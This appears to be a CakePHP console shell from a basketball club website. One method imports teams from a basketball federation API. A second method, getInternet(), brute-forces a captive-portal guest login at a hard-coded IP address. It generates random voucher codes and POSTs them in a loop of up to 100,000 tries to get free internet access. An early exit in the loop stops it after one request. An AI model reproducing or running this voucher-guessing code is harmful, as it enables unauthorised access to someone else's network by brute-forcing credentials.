<?php
namespace App\Shell;

use Cake\Console\Shell;
use Cake\Utility\Text;

/**
 * Import shell command.
 *
 * @property \App\Model\Table\TeamsTable $Teams
 */
class ImportShell extends Shell
{

  /* public function __construct($io)
   {
       //Load Models
       //$this->loadModel("Teams");

       parent::__construct($io);
   }*/

    /**
     * Syc teams form NBB api to local DB
     */
    public function sycTeams(){
        //Get all team
        $url = "http://db.basketball.nl/db/json/team.pl?clb_ID=81";

        //Get json file for api

        //TODO set to api
        $teams = file_get_contents($url);
        $teams = json_decode($teams);


        //TODO filter if there is dubbel comp_id

        //TODO create team categorys for menu
        foreach ($teams->teams as $team){

            //Create new team entity
            $teamEntities = $this->Teams->newEntity();
            $teamEntities->name = $team->naam;

            //Create slug
            $teamEntities->slug = strtolower(Text::slug(trim($team->naam)));
            $teamEntities->nbb_id = $team->id;
            $teamEntities->comp_id = $team->comp_id;

            //Save team
            $this->Teams->save($teamEntities);
        }

    }

    public function getInternet(){

        for($i =0; $i < 100000; $i++){
            $int = rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9)."-".rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9);
            echo "$int \n";

            $url = "http://178.63.77.69:8880/guest/s/default/login";

            $fields = "by=voucher&page_error=index.html&voucher=".$int;

            $ch = curl_init();
            curl_setopt($ch,CURLOPT_URL, $url );
        /*    curl_setopt($ch,CURLOPT_HEADER, false );
            curl_setopt($ch,CURLOPT_USERAGENT, 'User-Agent:"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"');
            curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch,CURLOPT_BINARYTRANSFER, true);*/
            curl_setopt($ch,CURLOPT_POST, 3 );
            curl_setopt($ch,CURLOPT_POSTFIELDS, $fields );

            debug($ch);

            $result = curl_exec($ch);
            exit;

            curl_close($ch);

            if($result == false){

                debug($result);
                exit;
            }

            //exit;

        }

    }
}
